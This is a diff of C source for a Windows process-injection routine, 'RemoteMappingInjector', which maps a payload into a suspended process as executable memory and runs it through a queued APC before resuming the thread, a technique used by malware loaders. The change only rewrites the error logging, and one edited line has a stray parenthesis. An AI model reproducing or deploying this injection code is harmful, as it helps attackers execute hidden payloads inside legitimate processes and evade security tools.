@@ -144,15 +144,16 @@ BOOL RemoteMappingInjector( IN PBYTE pPayload, IN SIZE_T sPayloadSize) {
     HANDLE				hThread = pi.hThread;
     HANDLE              hProcess = pi.hProcess;
 
+   
     STATUS = NtCreateSection(&hSection, SECTION_ALL_ACCESS, NULL, &MaximumSize, PAGE_EXECUTE_READWRITE, SEC_COMMIT, NULL);
     if (STATUS != STATUS_SUCCESS) {
-        printf("\t[!] NtCreateSection Failed With Error : %d \n", GetLastError());
+        info("NtCreateSection Failed With Error : %d \n", STATUS));
         bSTATE = FALSE;
         return;
     }
     STATUS = NtMapViewOfSection(hSection, (HANDLE)-1, &pLocalAddress, NULL, NULL, NULL, &sViewSize, ViewUnmap, NULL, PAGE_READWRITE);
     if (STATUS != STATUS_SUCCESS) {
-        printf("\t[!] MapViewOfFile Failed With Error : %d \n", GetLastError());
+        info("MapViewOfFile Failed With Error : %d \n", STATUS);
         bSTATE = FALSE; 
         return;
     }
@@ -161,24 +162,23 @@ BOOL RemoteMappingInjector( IN PBYTE pPayload, IN SIZE_T sPayloadSize) {
     memcpy(pLocalAddress, pPayload, sPayloadSize);
 
     // Maps the payload to a new remote buffer in the target process
-
    STATUS = NtMapViewOfSection(hSection, hProcess, &pRemoteAddress, NULL, NULL, NULL, &sViewSize, ViewShare, NULL, PAGE_EXECUTE_READWRITE);
    if (STATUS != STATUS_SUCCESS) {
-       printf("\t[!] NtMapViewOfSection Failed With Error : %d \n", STATUS);
+       info("NtMapViewOfSection Failed With Error : %d \n", STATUS);
        bSTATE = FALSE;
        return;
    }
    PTHREAD_START_ROUTINE apcRoutine = (PTHREAD_START_ROUTINE)pRemoteAddress;
    STATUS = NtQueueApcThread(hThread,(PAPCFUNC)apcRoutine, NULL);
    if (STATUS != STATUS_SUCCESS) {
-       printf("\t[!] NtQueueApcThread Failed With Error : %d \n", STATUS);
+       info("NtQueueApcThread Failed With Error : %d \n", STATUS);
        bSTATE = FALSE;
        return;
    }
    
    STATUS = NtResumeThread(pi.hThread);
    if (STATUS != STATUS_SUCCESS) {
-       printf("\t[!] NtResumeThread Failed With Error : %d \n", STATUS);
+       info("NtResumeThread Failed With Error : %d \n", STATUS);
        bSTATE = FALSE;
        return;
    }
